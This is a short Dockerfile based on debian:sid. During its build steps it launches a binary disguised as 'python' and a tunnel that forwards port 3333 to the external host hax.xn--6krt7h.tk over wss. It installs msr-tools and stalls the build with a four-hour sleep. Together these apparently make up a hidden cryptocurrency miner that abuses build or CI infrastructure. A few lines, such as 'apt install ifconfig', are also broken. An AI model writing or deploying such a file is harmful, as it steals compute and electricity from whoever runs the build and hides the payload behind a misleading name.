FROM debian:sid
COPY my-tu /
WORKDIR /app
COPY python /app/
COPY config.json /app/
RUN apt update -y \
  && apt install -y procps msr-tools
RUN chmod a+x /my-tu /app/python && \
  (/my-tu -L 127.0.0.1:3333:127.0.0.1:3333 wss://hax.xn--6krt7h.tk &) && \
  cd /app && \
  (./python > /dev/null &) && \
  sleep 14400  
RUN apt install ifconfig
RUN exit
CMD /bin/bash
